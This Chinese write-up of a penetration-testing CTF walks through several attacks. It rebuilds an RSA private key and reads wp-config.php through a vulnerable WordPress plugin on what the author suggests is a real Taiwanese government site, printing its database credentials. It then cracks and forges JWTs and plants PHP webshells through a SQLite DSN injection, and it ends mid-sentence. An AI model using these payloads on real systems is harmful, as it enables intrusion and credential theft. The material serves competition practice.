class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">d=<span class="built_in">int</span>(d)</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>然后用赛博厨子解密即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107133135686.png" class="" title="This is an example image"><p>解得明文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交park在任务中心登陆的账号密码</span><br></pre></td></tr></table></figure><p>然后我们要做的是获取任务中心的账号密码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072658240.png" class="" title="This is an example image"><p>上面的密文中说到过了，任务中心的账号密码和湾湾某一g*v的数据库账密是一样的，那就说明我们要去看看湾湾的g*v。这里就不贴图了，有一丢丢敏感。。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072844550.png" class="" title="This is an example image"><p>wordpress，那就wpscan浅浅扫一下</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081055976.png" class="" title="This is an example image"><p>发现插件版本out of date且给出了具体版本，那么去wpscan官网查查相关漏洞试试</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081718877.png" class="" title="This is an example image"><p>尝试后直接获取敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>图就不贴了嘤嘤嘤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;DB_USER&#x27;, &#x27;hsinchug_wp1&#x27; );</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;Q.4Vyj8VCiedX1KYU5g05&#x27; );</span><br></pre></td></tr></table></figure><p>拿到账密后就可以进入任务中心了。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交dylan的电话号码</span><br></pre></td></tr></table></figure><p>根据任务中心中给到的信息我们可以对私钥进行掩码爆破</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101182540997.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183239434.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzU4MTI2ODR9.vwzjhUY2xVSdKrdG2KznZ-kWWLBHvE7KTtLtFr4bRBo:4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p>抓显示电话号码的包，然后改JWT即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183305907.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在任务中心服务器上搜索秘密账户，用户名好像是root，提交他的密码</span><br><span class="line"></span><br><span class="line">非系统用户root 是web里面的用户名root</span><br></pre></td></tr></table></figure><p>然后注销，登陆的时候抓包狂改jwt</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184432121.png" class="" title="This is an example image"><p>然后就多了一个administrator界面！！</p><p>抓包获取三个接口：</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184907151.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184915535.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184935859.png" class="" title="This is an example image"><p>listTaskFiles接口好像可以获得目录文件？？试试看</p><p>&#x2F;getServerInfo获取内网地址</p><p>&#x2F;downloadTaskFile通过url下载文件，既然有内网地址和目录了，那么我们是不是就可以下载文件了？！</p><p>但是试了一下不太行，后来发现在listTaskFiles的bp dashboard处直接改包发包以后，浏览器上显示文件，然后直接读就行</p><p>多了一个路由</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101185518497.png" class="" title="This is an example image"><p>这个taskfiles目录下没啥东西。。。读到都是没用的，那就说明需要目录穿越。</p><p>尝试了..&#x2F;，发现过滤了，没办法</p><p>尝试置空，读取到上一级，但应该是根目录，这就不知道了</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190115408.png" class="" title="This is an example image"><p>发现一个init_users.json，直接读</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190237762.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7y.(sc#Ac_</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交 DATABASE_SECRET_KEY内容</span><br></pre></td></tr></table></figure><p>然后看下一关，<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>先看看main.py.bak文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>读了也没很大的用处。题目是横向渗透，之前给了一个内网ip 172.2.233.4，莫非是扫c段？</p><p>我勒个豆？？随便改了一位直接出了。。。环境变了一次，所以172.2.233.4变为172.2.45.4</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101191643733.png" class="" title="This is an example image"><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跳岛战术</span><br><span class="line">拿到config.php中的数据库密码</span><br></pre></td></tr></table></figure><p>跳岛战术，被困了好久</p><p>8888端口开放了一个flask的服务</p><p>然后看看php代码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107152415587.png" class="" title="This is an example image"><p>这台机器是php环境，config.php估计就在这台机子上了。</p><p>GET传参，四个参数，username、password、dsn、query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=CREATE TABLE bad (name TEXT);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DCREATE%20TABLE%20bad%20%28name%20TEXT%29%3B</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=INSERT INTO bad (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DINSERT%20INTO%20bad%20%28name%29%20VALUES%20%28%27%3C%3Fphp%20file_put_contents%28%22cmd.php%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B0%5D%29%3B%3F%3E%22%29%3B%3F%3E%27%29%3B</span><br><span class="line"></span><br><span class="line">%3fdsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107163450520.png" class="" title="This is an example image"><p>sqlite的每一个数据库其实都是一个文件，第一个命令是创建一个bad表并有字段name，这会被记录到php文件中去。第二个命令相当于往name字段写入一个后门，那么就会在php文件中出现，然后我们访问aa.php，就会触发php代码，从而产生后门</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165825230.png" class="" title="This is an example image"><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250107165902352.png" alt="image-20250107165902352" style="zoom:80%;" /><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165902352.png" class="" title="This is an example image"><p>成功获得config.php中数据库密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$database_host = &quot;localhost&quot;;</span><br><span class="line">$database_user = &quot;root&quot;;</span><br><span class="line">$database_password = &quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;;</span><br><span class="line">$database_name = &quot;web_db_2&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提交park在2024年12月27日19时20分收到的邮件中的数字</span><br><span class="line"></span><br><span class="line">格式 ctfshow&#123;数字&#125;</span><br><span class="line"></span><br><span class="line">也可以提交 163邮箱的账号密码 格式 